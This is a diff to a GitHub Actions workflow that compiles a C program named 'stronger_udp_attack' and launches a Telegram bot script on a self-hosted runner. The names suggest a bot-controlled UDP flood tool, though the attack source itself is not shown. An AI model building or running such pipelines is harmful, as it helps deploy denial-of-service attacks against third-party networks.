@@ -4,30 +4,26 @@ on:
   push:
     branches:
       - main
-  workflow_dispatch:  # Allow manual runs from the GitHub UI
+  workflow_dispatch:  # Allow manual trigger from the GitHub UI
 
 jobs:
   run-bot:
-    runs-on: self-hosted  # Use your self-hosted runner
+    runs-on: self-hosted
     steps:
-      - name: Check out the code
+      - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Set up Python environment
+      - name: Install dependencies
         run: |
-          sudo apt-get update -y
-          sudo apt-get install -y python3 python3-pip g++ make screen
-          pip3 install --upgrade pip
-          pip3 install pyTelegramBotAPI pymongo aiohttp
+          apt-get update && apt-get install -y python3 python3-pip g++ make
+          pip install --upgrade pip
+          pip3 install pyTelegramBotAPI python-dotenv python-telegram-bot
 
-      - name: Compile C Script
+      - name: Compile the C Program
         run: |
-          g++ -std=c++14 stronger_udp_attack.c -o stronger_udp_attack -pthread
+          gcc -o stronger_udp_attack stronger_udp_attack.c -pthread
+          chmod +x stronger_udp_attack
 
-      - name: Run the Telegram Bot
+      - name: Start the Telegram Bot
         run: |
-          screen -dmS soul_bot /usr/bin/python3 soul.py  # Run bot in a detached screen
-
-      - name: List Active Screen Sessions (Debugging)
-        run: |
-          screen -ls
+          python3 soul.py
